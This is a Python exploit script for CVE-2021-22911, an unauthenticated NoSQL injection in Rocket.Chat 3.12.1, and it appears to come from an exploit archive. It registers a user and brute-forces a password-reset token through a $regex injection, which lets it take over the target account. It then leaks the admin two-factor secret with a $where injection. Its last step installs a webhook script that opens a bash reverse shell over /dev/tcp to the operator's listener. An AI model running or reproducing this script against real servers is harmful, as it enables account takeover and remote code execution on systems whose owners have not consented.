# Title: Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated)
# Author: optional
# Date: 30-07-2021
# Product: Rocket.Chat
# Vendor: https://rocket.chat/
# Vulnerable Version(s): Rocket.Chat 3.12.1
# CVE: CVE-2021-22911
# Credits: https://blog.sonarsource.com/nosql-injections-in-rocket-chat

#!/usr/bin/python

import requests
import string
import time
import hashlib
import json
import oathtool
import argparse



def createuser(email,url,password):
	username = email.split('@')[0]
	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"registerUser\\",\\"params\\":[{\\"name\\":\\"'+ username +'\\",\\"email\\":\\"'+email+'\\",\\"pass\\":\\"'+ password +'\\",\\"confirm-pass\\":\\"'+ password +'\\"}],\\"id\\":\\"30\\"}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/registerUser", data = payload, headers = headers, verify = False, allow_redirects = False)
	temp = json.loads(r.text)
	data = json.loads(temp['message'])
	if 'Email already exists' in r.text:
		print(f'[+] User: {email} exists\n[+] Attempting to Authenticate With Provided Password')
		tokenData = getTokenId(email,url,password)
		if tokenData == False:
			print(f'[-] Unable to Authenticate\n[+] Commencing Account Takeover!')
			forgotpassword(email, url)	
			token = resettoken(url)
			changepassword(url, token, password)
		else:
			print(f'[+] Successfully Authenticated as {email}')
			return tokenData

	else:
		print(f"[+] {email} does not exist")
		userid = data['result']
		print("[+] Low Privilege User Created")
		print(f"[+] Username: {email}\n[+] Password: {password}")
		#token(data['result'], url)
		tokenData = getTokenId(email,url,password)
		return tokenData


def getTokenId(email, url, password):
	sha256pass = hashlib.sha256(bytes(password, encoding='utf8')).hexdigest()
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+ email +'\\"},\\"password\\":{\\"digest\\":\\"'+ sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}],\\"id\\":\\"14\\"}"}'
	headers = {'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/login", data = payload, headers = headers, verify = False, allow_redirects = False)
	if 'User not found' in r.text:
		return False
	else:
		tmp = r.text
		return tmp


def forgotpassword(email,url):
	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False)
	print("[+] Password Reset Email Sent")


def resettoken(url):
	u = url+"/api/v1/method.callAnon/getPasswordPolicy"
	headers={'content-type': 'application/json'}
	token = ""

	num = list(range(0,10))
	string_ints = [str(int) for int in num]
	characters = list(string.ascii_uppercase + string.ascii_lowercase) + list('-')+list('_') + string_ints
	print("[+] Pulling Password Reset Token")

	while len(token) != 43:		
		for c in characters:
			payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
			if 'Meteor.Error' not in r.text:
				token += c
				print(f'\r[+] Reset Token: {token}', end='', flush=True)
	return token


def changepassword(url, token, password):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"'+password+'\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "error" in r.text:
		exit("\n[-] Wrong token")
	print(f"\n[+] Password was changed to {password}")


def twofactor(url, email, password):
	# Authenticating
	sha256pass = hashlib.sha256(bytes(password, encoding='utf8')).hexdigest()
	payload ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+email+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	temp = json.loads(r.text)
	data = json.loads(temp['message'])
	userid = data['result']['id']
	token = data['result']['token']

	# Getting 2fa code
	cookies = {'rc_uid': userid,'rc_token': token}
	headers={'X-User-Id': userid,'X-Auth-Token': token}
	payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\'admin\'+%26%26+(()%3d>{+throw+this.services.totp.secret+})()"}'
	r = requests.get(url+payload,cookies=cookies,headers=headers)
	data = json.loads(r.text)
	if data["success"] == False:
		print('[+] NO 2FA DETECTED')
		return False
	else:
		## Implement the return for 2fa if it is enabled! /////////////////////////////////////
		pass


def rce(url, admin, password, secret, ip, port):
	# Authenticating

	tmp = json.loads(getTokenId(admin, url, password))
	data = json.loads(tmp['message'])
	userid = data['result']['id']
	token = data['result']['token']
	print("[+] Succesfully authenticated as administrator")

	# Creating Integration
	payload = '{"enabled":true,"channel":"#general","username":"admin","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true, "script": "class Script {\\n\\n  process_incoming_request({ request }) {\\n\\n\\tconst require = console.log.constructor(\'return process.mainModule.require\')();\\n\\tconst { exec } = require(\'child_process\');\\n\\texec(\'bash -c \\\"bash -i >& /dev/tcp/' + str(ip) + '/' + str(port) + ' 0>&1\\\"\');\\n\\t}\\n}","type":"webhook-incoming"}'
	cookies = {'rc_uid': userid,'rc_token': token}
	headers = {'X-User-Id': userid,'X-Auth-Token': token}
	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
	data = json.loads(r.text)

	token = data['integration']['token']
	_id = data['integration']['_id']
	print('[+] Sending Reverse Shell Integration')
	# Triggering RCE
	u = url + '/hooks/' + _id + '/' +token
	r = requests.get(u)
	if 'success' in r.text:
		print(f'[+] Shell for {ip}:{port} Has Executed!')
	else:
		print('[-] Error')

############################################################

def main():
	parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
	parser.add_argument('-u', help='Low Privilege Email (If this user does not exist, it will be created)', required=True)
	parser.add_argument('-a', help='Admin Email Address', required=False)
	parser.add_argument('-H', help='URL (Eg: http://rocketchat.local)', required=True)
	parser.add_argument('-p', help='Set passwords for accounts', required=False)
	parser.add_argument('--ip', help='Your Listener IP', required=False)
	parser.add_argument('--port', help='Your Listener Port', required=False)

	parser.set_defaults(reset=False)
	args = parser.parse_args()


	admin = args.a
	user = args.u
	target = args.H
	ip = args.ip
	port = args.port
	if args.p == None:
		password = 'P@$$w0rd!1234'
	else:
		password = args.p



	createuser(user, target, password)
	
	

	# Privilege Escalation to admin
	## Getting secret for 2fa
	secret = twofactor(target, user, password)

	if secret == False and args.a != None:
		#Escalation to Admin
		createuser(admin, target, password)
		if args.ip != None:
			rce(target, admin, password, secret, ip, port)
		else:
			pass
	else:
		pass




main()